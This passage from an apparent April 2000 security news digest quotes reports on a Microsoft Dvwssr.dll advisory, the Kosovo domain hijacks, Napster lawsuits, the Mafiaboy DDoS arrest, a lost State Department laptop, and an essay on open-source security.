      can be found at 
      http://www.microsoft.com/technet/security/bulletin/fq00-025.asp 

      
      Issue Dvwssr.dll is a server-side component used to support the Link View 
      feature in Visual Interdev 1.0. However, it contains an unchecked buffer. 
      If overrun with random data, it could be used to cause an affected server 
      to crash, or could allow arbitrary code to run on the server in a System 
      context. 

      By default, the affected component, Dvwssr.dll, resides in a folder whose 
      permissions only allow web authors to execute it. Under these conditions, 
      only a person with web author privileges could exploit the vulnerability  
      but a web author already has the ability to upload and execute code of his 
      choice, so this case represents little additional threat. However, if the 
      permissions on the folder were set inappropriately, or the .dll were 
      copied to a folder with lower permissions, it could be possible for other 
      users to execute the component and exploit the vulnerability. 

      
      Affected Software Versions The affected component is part of Visual 
      Interdev 1.0. However, it is a server-side component, and is included in 
      the following products 

      Microsoft® Windows NT® 4.0 Option Pack, which is the primary distribution 
      mechanism for Internet Information Server 4.0       Personal Web Server 
      4.0, which ships as part of Windows® 95 and 98 Front Page 98 Server 
      Extensions, which ships as part of Front Page 98. NOTE: Windows 2000 is 
      not affected by this vulnerability. Upgrading from an affected Windows NT 
      4.0 to Windows 2000 removes the vulnerability Installing Office 2000 
      Server Extensions on an affected server removes this vulnerability. 
      Installing FrontPage 2000 Server Extensions on an affected server removes 
      this vulnerability. 

      Remediation       To eliminate this vulnerability, customers who are 
      hosting web sites using any of the affected products should delete all 
      copies of the file Dvwssr.dll from their servers. The FAQ provides 
      step-by-step instructions for doing this. The only functionality lost by 
      deleting the file is the ability to generate link views of .asp pages 
      using Visual Interdev 1.0.

     The FBI has warned that North Carolina is infested with '6hackers'9
     and that business leaders should be concerned. Doris Gardner from the
     Charlotte office of the FBI said that several machines within North
     Carolina had been used in the recent massive DDoS attacks and that
     such attacks had been launched against North Carolina business. She
     refused to give further details citing the ongoing investigation but
     promised a wave of prosecutions soon. (Just what we need, the FBI
     running around claiming the sky is falling.)

     State Target
     North Carolina Businesses Target of Net Hackers 

   
     The Associated Press
     C H A P E L   H I L L, N.C., April 14  The FBI is investigating computer 
     hacking in North Carolina. FBI agents warn that Internet hackers have 
     targeted several North Carolina businesses in recent months. They say 
     several computer systems in the state have been used by hackers to attack 
     businesses. Investigators spoke Thursday at the annual forum of the North 
     Carolina Electronics and Information Technologies Association. They urged 
     private businesses to cooperate in stopping hackers who are wreaking 
     millions of dollars in damage. This summer, the FBI plans to form a task 
     force with businesses to share information and alerts about hacking 
     attempts. The FBI will also survey North Carolina businesses to see how 
     many have been the victims of cyber-attacks.

      More than 50 websites have been taken over by what is suspected to be a 
      group of Serb hackers. 

      The websites - which included such high-profile names as Manchester United 
      and Adidas - were stripped of their content, and branded with the image of 
      a double-headed eagle, with the words "Kosovo is Serbia". 

      

      A screen grab from eunet.com's hacked site

      Many of the sites were Yugoslav, Bosnian and Croatian. The Kosovo Albanian 
      newspaper Koha Ditore and the Albanian site Kosovapress were also among 
      those hacked. 

      In another development, the website of the Serbian Ministry of Information 
      reported that it and other Yugoslav sites had been taken over. 

      It said "American-Albanian propagandists" had forged the entire English 
      version of its site on Wednesday. 

      "In a planned and malicious action, regularly registered Yugoslav sites 
      were taken over on the central server of an American firm involved in the 
      registration of the internet domains," it added. 

      "Numerous sites of the Yugoslav providers, political parties and firms 
      were attacked in a synchronised manner," it said. 

      Chance discovery

      Most of the companies in the "Kosovo is Serbia" attack have since 
      reclaimed their websites. 

      Manchester United believes the culprits were "cyber-squatters", who 
      register internet sites in the names of celebrities or well-known 
      companies, and then try to sell them back again. 

      An internet company which monitors domain names, WebDNS, spotted that the 
      hacking was part of a sustained campaign. 

      Alex Jeffreys, the technical director of WebDNS, said he noticed that 
      several high-profile web-sites were being hacked on Monday. 

      "I almost stumbled over it by chance, when I noticed that a number of 
      large company domain names had changed ownership," he told News Online. 

      As he began checking details of some of the thousands of websites being 
      supported by the server Webprovider Inc, he discovered more than 50 sites 
      that had been hacked from the same address. 

      Hacked websites 
      
      viagra.com
      eunet.com
      winston.com
      jamesbond.com
      indianajones.com

      bosnia.com
      sarajevo.com
      warcrimesmonitor.com
      arkan.com
      tudjman.com 

      The hacked websites had all been registered with Network Solutions, the 
      world's largest register. 

      Mr Jeffreys said it appeared that the hackers had changed the contact 
      details in Network Solutions' database on Sunday night. 

      The contact addresses were at first transferred to a Yugoslav address, and 
      then on Monday night to an Albanian address. 

      "It seems that the Network Solutions database is quite open for hacking, 
      rather than it being one company in particular," he said. 

      How the hackers worked 

      It is impossible to say exactly who the hackers are, or how they managed 
      to breach databases that should be secure. 

      However, Mr Jeffreys said they probably sent spoof e-mails to Network 
      Solutions, pretending to be from the company concerned, and requesting a 
      change of address. 

      The requests for a modification are sent by an automatic e-mail form. 

      Although Network Solutions was not available for comment, a message on 
      their answer machine said that "if you are making a registrar name change 
      or contact modifications request" there would be delays while they 
      "carefully review your request for change".

     Security Glitch Turns Major Web Sites Into Kosovo Billboards 

     Hackers got into more than 50 Web sites in what appeared to be a 
     coordinated effort to promote Serbs in Kosovo. This is what slovenia.com 
     looked like after the cyber attack. (slovenia.com)


     By Andrew Chang

     April 14  This week, the tensions in Kosovo reached around the world, into 
     innumerable desktops  thanks to a group of hackers. Hackers got into more 
     than 50 Web sites  including those of some high-profile names, like 
     addidas.com, mgm.com and viagra.com  in what appeared to be a coordinated 
     effort to promote Serbs in Kosovo. The sites were stripped of their 
     content, and branded with an image of a two-headed eagle with the words, 
     Kosovo is Serbia. The two-headed eagle is a common image in southeastern 
     Europe. It is used by Bosnian Serbs, as well as Albanians, the former 
     Kosovo Liberation Army, and Russians. One London newspaper report said the 
     hackers had hit up to 2,000 Web sites. Among the other sites that were 
     hacked were indianajones.com and jamesbond.com. Many of the targets were 
     from the Balkans. The Kosovo Albanian newspaper Koha Ditore and the 
     Albanian site Kosovoapress were also among those hacked, the BBC reported. 
     Most of the companies have since reclaimed their Web sites. 

     An Odd Discovery 

     Alex Jeffreys, technical director for WebDNS, a London-based Web security 
     and registration firm, says he first noticed the hacking on Monday, when he 
     noticed a large number of domains had changed ownership.      Jeffreys told 
     ABCNEWS.com he was scanning a public directory of domain names when he 
     noticed many of them had moved the domain name contacts away from their 
     rightful owners to a Hotmail e-mail address. It is unusual for established 
     companies to move their contact e-mail address to a free e-mail service 
     like Hotmail, Jeffreys said. Signing up for Hotmail is almost anonymous  
     and brand-name companies usually have e-mail addresses based off their own 
     sites. 

     Network Solutions to Blame? 

     All the hacked Web sites had been registered with Network Solutions, the 
     worlds largest register.      The hackers manged to breach security by 
     sending spoof e-mails to Network Solutions, pretending to be from the 
     company concerned and requesting a change of address, said a spokesperson 
     for Network Solutions, who declined to be identified. The spokesperson said 
     the chosen Web sites were hacked because they used the most basic level of 
     online security  an automated process where the e-mail address of a user 
     requesting a change of address is only checked against the e-mail address 
     on record of the person authorized to make such a change, By forging their 
     e-mail addresses, the hackers fooled the automation into thinking they were 
     authorized to make a change  and subsequently moved authority for the site 
     to a Hotmail account. The company does offer its users higher levels of 
     security, the Networks Solutions spokesperson said. Most of the prominent 
     sites were back to normal today, and made no mention of the hacking. A few, 
     like slovenia.com, still displayed the Kosovo is Serbia brand. Others, 
     like eunet.com and yu.com, appeared to have been shut down altogether. 
     Jeffreys hoped the Web sites had learned a valuable lesson about security. 
     It shouldnt be that simple to make the change, he said.

      Metallica's Napster hit: 'Enter Lawman'

      Rock group sues Napster and several colleges, alleging copyright violation 
      by allowing the illegal swapping of its storied music. Cybervandals 
      retaliate.

      By Lisa Bowman, ZDNet News       UPDATED April 14, 2000 12:32 PM PT 

      The rock group Metallica has sued Napster Inc. and several colleges, 
      claiming, among other things, that they violated copyright law by allowing 
      illegal swapping of its music. E/M Ventures and Creeping Death Music are 
      also plaintiffs in the suit, which was filed in U.S. District Court in the 
      Central District of California and targets the University of Southern 
      California, Yale University and Indiana University.       In apparent 
      retaliation Friday, Metallica's Web site was targeted by cybervandals. The 
      unknown hackers left a simple message: "LEAVE NAPSTER ALONE." Aside from 
      two links -- one to Napster and another to the main page of the official 
      Metallica site -- no other message, on the page or in the source code, was 
      posted.

      This is the first time a music group has gone after Napster, the 
      controversial software that allows people to locate and copy MP3 files.

      
      Dozens of colleges have banned its use, claiming it hogged bandwidth and 
      fearing they would be slapped with lawsuits similar to this one. However, 
      in February, USC bucked that trend, saying that it would continue to allow 
      its students to use the technology, which is downloadable from the 
      Internet.

      San Mateo, Calif.-based Napster already is the target of a suit by the 
      Recording Industry Association of America, which claims that Napster 
      violates the Digital Millennium Copyright Act, a new law that bars devices 
      that could be used to circumvent copyrights.

      
       The suit says students who use Napster 'exhibit the moral fiber of common 
       looters.' 

      Having Metallica as a plaintiff in this latest case gives the industry 
      even more brand-name backing.

      The recording industry is worried that digital music files will weaken 
      their power over the sale and distribution of songs, and Napster is one of 
      several new technologies that make it easier for people to swap digital 
      music files.

      'Morally and legally wrong'       In a press release announcing the suit, 
      publicists for the band and music companies even threw in a statement from 
      Metallica drummer Lars Ulrich, who said it is "sickening to know that our 
      art is being traded like a commodity rather than the art that it is."

      "From a business standpoint, this is about piracy -- aka taking something 
      that doesn't belong to you -- and that is morally and legally wrong."

      In the suit, Metallica and the music companies claim that Napster not only 
      violated their copyrights, but also encouraged unlawful use of digital 
      audio devices and enabled the violation of the Racketeering Influenced & 
      Corrupt Organizations Act, or RICO.

      The suit says that students who use Napster to copy files "exhibit the 
      moral fiber of common looters."

      Napster officials weren't immediately available for comment.

      State Dept. Computer With Secrets Vanishes
           
       
      By Steven Mufson Washington Post Staff Writer Monday, April 17, 2000; Page 
      A02 

      

      A laptop computer containing top-secret information vanished from the 
      State Department's Bureau of Intelligence and Research more than a week 
      ago, and the FBI is investigating whether it was stolen, a senior State 
      Department official said. 

      
      The laptop's disappearance from a supposedly secure conference room at the 
      department has set off an intense effort to recover the computer and a 
      search for suspects, including contractors who have been renovating the 
      area, the official said.

      
      Another person familiar with the incident said that the missing computer 
      contains "code word" information, a classification higher than top secret, 
      and that it includes sensitive intelligence information and plans.

      
      The incident is the latest of a string of embarrassing security breaches 
      at the State Department. Last year, counterintelligence officials from the 
      FBI discovered a Russian spy lurking outside the department and later an 
      eavesdropping device planted in a conference room. In 1998, a man dressed 
      in a tweed coat strolled into the executive secretary's office, six doors 
      down from the office of Secretary of State Madeleine K. Albright, helped 
      himself to a sheaf of classified briefing materials in plain view of two 
      secretaries, and walked out. The man was never identified and the 
      materials were never recovered.

      
      A senior State Department official said that it remained unclear whether 
      the laptop was misplaced or stolen and that, if it was stolen, whether the 
      thief realized the sensitivity of the material it contained or took it 
      simply for the value of the hardware.

      
      The senior State Department official added that the laptop's disappearance 
      was not the result of poor security procedures, but rather the failure of 
      State employees to follow those procedures. He said it appeared that some 
      contractors had not been properly escorted when working in the building.

      
      "Some policies and procedures were not followed," said the senior 
      official. "It is my very sincere hope that the responsible individual or 
      individuals will be punished."

      
      Another person familiar with the incident said that an official had 
      propped open the door of a secure conference room, that contractors 
      lacking security clearances were working in the sensitive area and that 
      the laptop had not been properly secured.

      
      The material the laptop contains is classified as "sensitive compartmented 
      information" (SCI), the government's most sensitive intelligence reports. 
      The Bureau of Intelligence and Research (INR) is responsible for handling 
      all top-secret reports at State; information with lower levels of 
      classification is handled by the Office of Diplomatic Security.

      
      Last year, INR came under fire from the department's inspector general for 
      lax handling of that material. "The department is substantially not in 
      compliance with the director of central intelligence's directives that 
      govern the handling of SCI," the inspector general, Jacqueline 
      Williams-Bridger, concluded in the report.

      
      The CIA also "questioned INR's dedication" to the proper handling of the 
      top-secret material, the State Department official said. The CIA and other 
      agencies believe that the State Department in general fails to attach 
      adequate importance to safeguarding secrets.

      
      The inspector general recommended transferring responsibility for SCI to 
      State's Office of Diplomatic Security. But a just-completed internal 
      review recommended leaving responsibility for SCI with INR and adding 19 
      new people to help the bureau better handle the material, the department 
      official said.

      
      The inspector general's report and the Russian bugging incident prompted 
      criticism from Congress, which sequestered some funding earmarked for INR 
      and demanded a review of how top-secret information is handled at the 
      department. At a Feb. 7 presentation of State's budget, Albright said she 
      was "continuing to study the possible need for structural changes to 
      ensure that the mandate for the best security is everywhere understood and 
      everywhere applied."

      
      The State Department laptop incident follows two intelligence episodes 
      involving stolen laptops in England. A laptop containing sensitive 
      information was stolen from a British army officer at Heathrow Airport. 
      Separately, a laptop containing secret information about Northern Ireland 
      was stolen from an MI5 agent at the Paddington Station of the London 
      Underground. In a third incident, an MI6 officer left his laptop computer 
      containing training information about how to be a spy in a taxi after a 
      night spent drinking at a bar near the agency's London headquarters.

      
      MI6 is the British agency responsible for foreign intelligence and foreign 
      spies; MI5 handles internal security matters.

      
      The MI6 officer's laptop was recovered after the agency placed a 
      classified ad in a newspaper offering a reward for its return. The MI5 
      officer's computer has not been found.

      (IDG) -- Pirates. That's all the infuriated music industry sees in 
      Napster, the first online application that lets you download basically any 
      MP3 music without spending a dime. In fact, the Recording Industry 
      Association of America has pushed Napster out on the plank: A San 
      Francisco judge soon will rule on its lawsuit alleging Napster runs a 
      giant haven for music piracy. 

      But the Napster case may be only the opening sword fight. The recording 
      industry is taking very seriously what it considers Internet plundering of 
      its jewels. And new sentencing guidelines scheduled to take effect in May 
      could actually land MP3 pirates in the brig. That is, while simple 
      hobbyist downloads are tough to track, Netizens who violate copyright law 
      by aggressively sharing software and digital tunes face arrest and even 
      jail. 
        
      Napster is not the only target. Since that suit was filed in December, a 
      fleet of similar applications has sailed onto the Net. Web-based 
      applications such as Gnutella, Napigator, and Wrapster are making it just 
      about impossible to protect music, software programs, photographs, videos, 
      or almost any other copyrighted digital material. The sites promote the 
      programs for legal MP3 trading and often post a policy statement to that 
      effect. In reality, the sites do not police their users (and sometimes 
      note that, as well).

      The cops know they can't stop everybody, but they aim to get everyone's 
      attention. 

      "There is no way we can arrest a million people," acknowledges Glenn Nick, 
      assistant director of the U.S. Customs Agency's CyberSmuggling Center. The 
      distribution programs have flooded out far too widely for law enforcement 
      to stop all cases of illegal copying. Unlike Napster, many programs in 
      this new breed operate peer-to-peer, so there's no central site for 
      investigators to target.

      But brace yourself for some serious arrests. 

      "People say you can't do anything about speeding," says Randy Thysse, 
      supervisory special agent at FBI headquarters in Washington, D.C. "But 
      [you can] park a cruiser on the side of the road to slow people down." 

      So watch for that virtual patrol car, and expect more than a ticket. 
      Thysse advocates jail time for software and music buccaneers -- and 
      starting next month, judges may go along with him. 

      Convicted copyright offenders can receive jail time under new sentencing 
      guidelines that take effect May 1. The policies cover intellectual 
      property offenses on an emergency interim basis, and stem from the 1997 No 
      Electronic Theft Act. 

      "It's getting increasingly easy to swap software and increasingly hard to 
      catch pirates," says John Wolfe, manager of investigations for the 
      Business Software Association. "These new sentencing guidelines give law 
      enforcement some real ammunition." 

      I fought the law and the law... won?       While the Justice Department 
      has shown a great resolve to stop computer piracy, until now criminal 
      penalties have been limited. They are too small to justify the big price 
      tags of investigation and prosecution, says the FBI's Thysse. 

      The BSA and others are betting that high-profile busts will send a clear 
      message to intellectual property crooks. "The odds are you aren't going to 
      get caught," says Wolfe, but you'll never know. 

      You're taking a two-pronged risk when you use these file-swapping tools, 
      points out Nick of the Customs Department. 

      As part of the process, you open your PC to the public so you can download 
      files. This exposes your PC to hackers and viruses. 

      It also exposes you legally. You're a private Netizen when you're simply 
      surfing, but when you open a subdirectory of your PC, you've changed your 
      online status and have become a de facto server, subject to law 
      enforcement investigations. And if they bust you, they can take your 
      equipment. 

      Clearly, law enforcement is doing more than sabre-rattling. But as an 
      aside, Nick comments that it's also time the music industry developed 
      better digital safeguards instead of relying on electronic cops.

      Peeking into the secret-sharers       What does this controversy look like 
      from the other side? 

      I took a look at Gnutella, one of dozens of these new-breed file-swapping 
      programs popping up all over the Net. It connects you to a peer-to-peer 
      distributed network -- basically, a 24-hour impromptu digital swap meet 
      online. 

      Like similar programs, it is clumsy but powerful. Once Gnutella is 
      installed, you must designate a directory on your computer to make 
      "public" and one to receive downloaded files. Connect to the Internet, and 
      the program automatically links you to thousands of people running 
      Gnutella on their PCs. 

      Once connected, your "public" directory and anything in it become part of 
      a gargantuan keyword-searchable database. You can request MP3s, games, 
      software applications, and music videos. Your request moves quickly from 
      computer to computer, returning links to files. Simply click on the files 
      you want, and programs begin to download. Napster, it should be noted, is 
      aimed at music files, while Gnutella has a broader reach. 

      No, PC World does not condone illegal copying of files, and neither does 
      the quasi-official Gnutella site. "There is nothing inherently illegal 
      about sharing files," points out Ian Hall-Beyer, host of the site. 

      But it's clearly a popular pastime. With the Gnutella "monitor" function 
      selected, you can watch in astonishment, as I did, as anonymous users 
      scanned my public directory looking for everything from Windows 2000 and 
      Photoshop to X-rated images and Britney Spears MP3s. (Outta luck, guys!) 

      And at any given moment, hundreds of people are running Gnutella, 
      Napigator, Wrapster, Napster, and similar programs that are still 
      surfacing. They're busily downloading files -- some of them perfectly 
      legally -- but now the feds have them in their spyglass.

      Wide Open Source Is Open Source really more secure than closed? Elias Levy 
      says there's a little security in obscurity. By Elias Levy April 16, 2000 
      11:59 PM PT

      One of the great rallying cries from the Open Source community is the 
      assertion that Open Source Software (OSS) is, by its very nature, less 
      likely to contain security vulnerabilities, including back doors, than 
      closed source software. The reality is far more complex and nuanced.

      Advocates derive their dogmatic faith in the implicit security of Open 
      Source code from the concept of "peer review," a cornerstone of the 
      scientific process in which published papers and theories are scrutinized 
      by experts other than the authors. The more peers that review the work, 
      the less likely it is that it will contains errors, and the more likely it 
      is to become accepted.

      Open Source apostles believe that releasing the source code for a piece of 
      software subjects it to the same kind of peer review as a quantum physics 
      theory published in a scientific journal. Other programmers, the theory 
      goes, will review the code for security vulnerabilities, reveal and fix 
      them, and thus the number of new vulnerabilities introduced and discovered 
      in the software will decrease over time when compared to similar closed 
      source software.

      It's a nice theory, and in the ideal Open Source world, it would even be 
      true. But in the real world, there are a variety of factors that effect 
      how secure Open Source Software really is.

      Sure, the source code is available. But is anyone reading it? 

      If Open Source were the panacea some think it is, then every security hole 
      described, fixed and announced to the public would come from people 
      analyzing the source code for security vulnerabilities, such as the folks 
      at OpenBSD, the Linux Auditing Project, or the developers or users of the 
      application. There have been plenty of security vulnerabilities in Open 
      Source Software that were discovered, not by peer review, but by black 
      hats.       But there have been plenty of security vulnerabilities in Open 
      Source Software that were discovered, not by peer review, but by black 
      hats. Some security holes aren't discovered by the good guys until an 
      attacker's tools are found on a compromised site, network traffic captured 
      during an intrusion turns up signs of the exploit, or knowledge of the bug 
      finally bubbles up from the underground.

      Why is this? When the security company Trusted Information Systems (TIS) 
      began making the source code of their Gauntlet firewall available to their 
      customers many years ago, they believed that their clients would check for 
      themselves how secure the product was. What they found instead was that 
      very few people outside of TIS ever sent in feedback, bug reports or 
      vulnerabilities. Nobody, it seems, is reading the source.

      The fact is, most open source users run the software, but don't personally 
      read the code. They just assume that someone else will do the auditing for 
      them, and too often, it's the bad guys.

      Even if people are reviewing the code, that doesn't mean they're qualified 
      to do so. 

      In the scientific world, peer review works because the people doing the 
      reviewing possess a comparable, or higher, technical caliber and level of 
      authority on the subject matter than the author.

      It is generally true that the more people reviewing a piece of code, the 
      less likely it is the code will have a security flaw. But a single 
      well-trained reviewer who understands security and what the code is trying 
      to accomplish will be more effective than a hundred people who just 
      recently learned how to program.

      It is easy to hide vulnerabilities in complex, little understood and 
      undocumented source code. 

      Old versions of the Sendmail mail transport agent implemented a DEBUG SMTP 
      command that allowed the connecting user to specify a set of commands 
      instead of an email address to receive the message. This was one of the 
      vulnerabilities exploited by the notorious Morris Internet worm.

      Sendmail is one of the oldest examples of open source software, yet this 
      vulnerability, and many others, lay unfixed a long time. For years 
      Sendmail was plagued by security problems, because this monolithic 
      programs was very large, complicated, and little understood but for a few.

      Vulnerabilities can be a lot more subtle than the Sendmail DEBUG command. 
      How many people really understand the ins and outs of a kernel based NFS 
      server? Are we sure its not leaking file handles in some instances? Ssh 
      1.2.27 is over seventy-one thousand lines of code (client and server). Are 
      we sure a subtle flaw does not weakening its key strength to only 40-bits?

      There is no strong guarantee that source code and binaries of an 
      application have any real relationship. 

      All the benefits of source code peer review are irrelevant if you can not 
      be certain that a given binary application is the result of the reviewed 
      source code.

      Ken Thompson made this very clear during his 1983 Turing Award lecture to 
      the ACM, in which he revealed a shocking, and subtle, software subversion 
      technique that's still illustrative seventeen years later.

      Thompson modified the UNIX C compiler to recognize when the login program 
      was being compiled, and to insert a back door in the resulting binary code 
      such that it would allow him to login as any user using a "magic" 
      password.

      Anyone reviewing the compiler source code could have found the back door, 
      except that Thompson then modified the compiler so that whenever it 
      compiled itself, it would insert both the code that inserts the login back 
      door, as well as code that modifies the compiler. With this new binary he 
      removed the modifications he had made and recompiled again.

      He now had a trojaned compiler and clean source code. Anyone using his 
      compiler to compile either the login program , or the compiler, would 
      propagate his back doors.

      The reason his attack worked is because the compiler has a bootstrapping 
      problem. You need a compiler to compile the compiler. You must obtain a 
      binary copy of the compiler before you can use it to translate the 
      compiler source code into a binary. There was no guarantee that the binary 
      compiler you were using was really related to the source code of the same.

      Most applications do not have this bootstrapping problem. But how many 
      users of open source software compile all of their applications from 
      source?

      A great number of open source users install precompiled software 
      distributions such as those from RedHat or Debian from CD-ROMs or FTP 
      sites without thinking twice whether the binary applications have any real 
      relationship to their source code.

      While some of the binaries are cryptographically signed to verify the 
      identity of the packager, they make no other guarantees. Until the day 
      comes when a trusted distributor of binary open source software can issue 
      a strong cryptographic guarantee that a particular binary is the result of 
      a given source, any security expectations one may have about the source 
      can't be transferred to the binary.

      Open Source makes it easy for the bad guys to find vulnerabilities. 

      Whatever potential Open Source has to make it easy for the good guys to 
      proactively find security vulnerabilities, also goes to the bad guys.

      It is true that a black hat can find vulnerabilities in a binary-only 
      application, and that they can attempt to steal the source code to the 
      application from its closed source. But in the same amount of time they 
      can do that, they can audit ten different open source applications for 
      vulnerabilities. A bad guy that can operate a hex editor can probably 
      manage to grep source code for 'strcpy'.

      Security through obscurity is not something you should depend on, but it 
      can be an effective deterrent if the attacker can find an easier target.

      So does all this mean Open Source Software is no better than closed source 
      software when it comes to security vulnerabilities? No. Open Source 
      Software certainly does have the potential to be more secure than its 
      closed source counterpart.

      But make no mistake, simply being open source is no guarantee of security.

     By Jonathan Dube and Brian Ross 

     April 19  A 15-year-old Canadian who goes by the online moniker Mafiaboy 
     has been arrested in connection with the February attacks on major Web 
     sites, ABCNEWS has learned. 

     * Mafiaboy caught. RealVideo video available on site

     Canadian authorities obtained a search warrant for the teens home in the 
     Montreal area over the weekend and confiscated computer-related equipment 
     suspected of being used in the February attacks against major Web sites in 
     the U.S.      Mafiaboy, whose identity is protected under Canadian law, was 
     arrested on April 15 and charged with two counts of mischief to data for 
     the attack that jammed up to 1,200 CNN-hosted Web sites for about two hours 
     Feb. 8, said Inspector Yves Roussel of the Royal Canadian Mounted Police at 
     a press conference this morning. After appearing in Youth Court Tuesday, 
     the 15-year-old was released on bail under the condition that he not use a 
     computer without a teacher present and he not visit stores that sell 
     computers or related equipment. The Web attacks alarmed Internet users 
     across the globe and shook the e-commerce industry because of the ease with 
     which major sites were made inaccessible. The attackers took over computers 
     around the world and used them to bombard victims sites with so much data 
     that users could not access them. 

     School Computer Used in Attacks

     Investigators were able to trace the attacks to Mafiaboy by examining the 
     log files of a computer at a University of California at Santa Barbara 
     research lab, which was among those used to attack the CNN.com site.      A 
     hacker electronically broke into the UCSB computer on Feb. 8 and instructed 
     it to send large amounts of traffic to CNN.coms Web site, campus network 
     programmer Kevin Schmidt told ABCNEWS.com. Roussel also said that the 
     suspects bragging about his exploits in chat rooms frequented by hackers 
     like Internet Relay Chat (IRC) had helped lead investigators to Mafiaboy. 

     Revealing Chat Room Logs

     ABCNEWS.com first reported that Mafiaboy was one of the top suspects in the 
     attacks on Feb. 16. The FBI had obtained chat room logs showing that 
     Mafiaboy asked others what sites he should take down  before the sites 
     were attacked.      Internet security expert Michael Lyle told ABCNEWS.com 
     at the time that he communicated with Mafiaboy and the 15-year-old claimed 
     credit for attacking not only CNN.com but also E*TRADE and several smaller 
     sites. Mafiaboy also shared technical information that only someone 
     involved in the attacks would know, Lyle said. Mafiaboy was saying What 
     should I hit next? What should I hit next? and people on the channel were 
     suggesting sites, and Mafiaboy was saying, OK, CNN, said Lyle, the chief 
     technology officer for Recourse Technologies Inc., an Internet security 
     company in Palo Alto, Calif. And shortly thereafter the people on the 
     channel would be talking about CNN going down. If you look at the time 
     stamps on the logs, they also coincide with CNN going down. Lyle said the 
     log files show similar discussions prior to the Feb. 9 attacks on E*TRADE 
     and several other smaller sites. A subscriber called Mafiaboy previously 
     held two accounts with Delphi Supernet, a Montreal Internet service 
     provider that Toronto-based ISP Internet Direct bought last year. The 
     accounts were closed in March 1998 because Mafiaboy violated subscriber 
     policies, but Internet Direct would not say what the violations entailed. 
     Authorities are unable to release specifics about the investigation because 
     it is ongoing, but both Roussel and the FBIs William Lynn indicated there 
     could be more arrests. A massive international crime investigation into 
     the remaining denial of service attacks continues, said Lynn.

      of flying saucers or little green men among the Air Force base buildings 
      and roadways. 

      Raleigh-based Aerial Images Inc. - in collaboration with Kodak, Digital 
      Equipment Corp., Autometric Inc. and the Russian agency Sovinformsputnik - 
      posted five images of the hush-hush desert proving ground on the Web on 
      Monday. 

      ''This is the first glimpse into the most secret training and testing 
      facility for the Air Force,'' said John Hoffman, president of Aerial 
      Images.      

      
      Talk about the Area 51 aerial photos However, the partners' Web site, 
      www.terraserver.com, didn't respond much of the time Tuesday.

      ''The site is being hammered, and hackers are attacking it,'' Hoffman 
      said. 

      He said there were signs of hackers trying to penetrate the site's 
      firewall, the software designed to prevent unauthorized outsiders from 
      tampering with computer files. They couldn't reach the data, but they were 
      able to slow the system, Hoffman said. 

      He noted that the Area 51 photos had attracted an estimated 3 million 
      ''page views'' to the Web site since Monday morning, compared with the 
      normal usage of 700,000 to 800,000 per day. 

      Viewing the images is free; downloading them costs $8.95 and up. Kodak 
      will make prints for $20 to $30. 

      The Air Force only recently acknowledged that Area 51 - the Groom Dry Lake 
      Air Force Base - even exists. The 8,000-square-mile base is 75 miles 
      northwest of Las Vegas, in the rugged Nellis Range. 

      Beginning with the U-2 spy plane in the 1950s, the base has been the 
      testing ground for a host of top-secret aircraft, including the SR-71 
      Blackbird, the F-117A stealth fighter and B-2 stealth bomber. 

      The site is known as Area 51 among UFO aficionados because that was the 
      base's designation on old Nevada test site maps. Some believe alien 
      vehicles, unidentified flying objects, are hidden at the base and their 
      parts are copied for U.S. prototypes. 

      Aerial Images launched a Russian satellite in 1998 to map the Earth's 
      surface under an open-skies agreement signed in 1992 by 24 nations, 
      including the United States and Russia. 

      The images have resolution good enough to distinguish a car from a truck. 

      Several government agencies are aware of the new images and haven't 
      responded, said Hoffman, 52. ''I've had no feedback from anybody that 
      indicates anybody gives a hoot,'' he said. 

      ''We acknowledge having an operating site there, and the work is 
      classified,'' Air Force spokeswoman Gloria Cales said. The work involves 
      ''operations critical to the U.S. military and the country's security.'' 

      The images show hundreds of buildings including living quarters, tennis 
      courts, a baseball field, a track and a swimming pool, plus craters in the 
      ground. 

      Visible roads are not paved and there are no parking lots; buses are the 
      only visible vehicles. Some of the roads appear to run into cliffs, 
      suggesting an underground network. 

      Chris Carter, creator of The X-Files, apparently was skeptical when 
      Hoffman told him of the satellite images. Some of the show's favorite 
      themes are UFOs and secret government activities. 

      ''He clearly didn't believe me,'' Hoffman said. ''From his tone, you could 
      tell he didn't believe me that we had Area 51 and we had the whole area 
      covered.''

     An Australian newspaper is reporting that malicious netizens may be
     able to claim copyright infringement in an interesting twist on
     copyright law in Australia that prevents reverse engineering without
     the permission of the copyright holder. The reverse engineering of
     certain tools to aid in prosecution could be prevented unless done
     with the copyright holders permission.

      Hackers can claim copyright on tools DAVID HELLABY

      

      ANTI-HACKER groups face problems giving evidence against groups or 
      individuals using software developed for breaking into computer systems, 
      because of a bizarre twist in copyright laws.

      Australian Computer Emergency Response Team co-founder Rob McMillan said 
      anybody who reverse-engineered a hacking tool to see how it worked ran a 
      risk using the evidence in court because it could be a breach of the 
      author's copyright.       The evidence may have been illegally obtained 
      and therefore be inadmissible, he said.

      AusCERT was working with local lawmakers to close the loophole in 
      intellectual property legislation, he said.

      "I don't know of any cases of hackers claiming copyright, but some have 
      large enough egos to consider it," Mr McMillan said.

      US legislators had tackled the problem, he said.

      The distributed denial of service attacks that shut down several large US 
      Web sites in February used software tools developed by hackers and 
      distributed over the Internet.

      Local companies and organisations were under unprecedented attack this 
      year, Mr McMillan said. There had been more computer security incidents 
      reported in the first three months this year than for the whole of last 
      year.

      About 2000 incidents ranging from scanning of systems to denial of service 
      attacks were reported to AusCERT to the end of March.

      Mr McMillan warned the security situation was not likely to improve.

      "We are on the verge of a major leap in technology, but as our knowledge 
      increases so does the knowledge of those we are up against," he said.

      Contrary to what some thought, AusCERT was not an enforcement organisation 
      but assisted members with advice on dealing with security situations, he 
      said. It was often unable to report incidents to police because a member 
      organisation that had suffered an attack did not want it reported.

      But AusCERT maintained a good relationship with law enforcement 
      authorities and often acted as a conduit for information from people and 
      organisations that did not want to be identified, he said.

84.0 [HNN] The Erosion of Privacy on the Net 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     contributed by root66 
     Looks like we missed it when it first came out but the March 20
     edition of Business Week has an excellent story on the state of online
     privacy today. They are theorize where the future could go and just
     how bad it might get. If you have been sitting idly by ignoring the
     privacy issues we suggest you read this.
     
     Business Week
     
     http://www.businessweek.com/2000/00_12/b3673001.htm
     
      It's Time for Rules in Wonderland Here's Business Week's four-point plan 
      to solve the Internet privacy mess 

      If Lewis Carroll had written about Alice's adventures today, she would 
      find herself passing through the looking glass and into cyberspace. She 
      would meet up with dodos, duchesses, and eggheads, some of whom would 
      spout the rough equivalent of '''Twas brillig, and the slithy toves....'' 
